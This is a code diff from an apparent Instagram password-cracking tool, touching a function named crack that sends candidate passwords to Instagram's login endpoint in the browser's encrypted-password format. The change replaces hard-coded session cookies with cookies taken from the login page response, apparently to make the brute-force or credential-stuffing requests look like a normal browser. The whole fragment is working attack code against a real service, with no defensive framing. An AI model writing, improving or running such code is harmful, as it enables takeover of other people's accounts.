@@ -125,16 +125,15 @@ def crack(uid, pww, total_idz):
             time_now = int(datetime.now().timestamp())
             enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
             response = session.get('https://www.instagram.com/accounts/login/')
-            csrf_token = response.cookies['csrftoken']
-            cookies = {
-                'csrftoken': csrf_token,
-                'mid': 'ZsCYoAALAAGlcbYkVN23DYxQwevD',
-                'ig_did': 'E68CEB20-E5E7-4BF3-BE61-C5EF4084D93B',
-                'ig_nrcb': '1',
-                'datr': 'npjAZqX5wY3c_CtTDAvR0Ls3',
-                'ps_l': '1',
-                'ps_n': '1',
-                'wd': '885x773',}
+            cookies =  {
+                'csrftoken': response.cookies.get('csrftoken'),
+                'mid': response.cookies.get('mid'),
+                'ig_did': response.cookies.get('ig_did'),
+                'datr': response.cookies.get('datr'),
+                'ig_nrcb': response.cookies.get('ig_nrcb', '1'),
+                'ps_l': response.cookies.get('ps_l', '1'),
+                'ps_n': response.cookies.get('ps_n', '1'),
+                'wd': response.cookies.get('wd', '885x773'),}
             data = {
                 "enc_password": enc_password,
                 'optIntoOneTap': 'false',
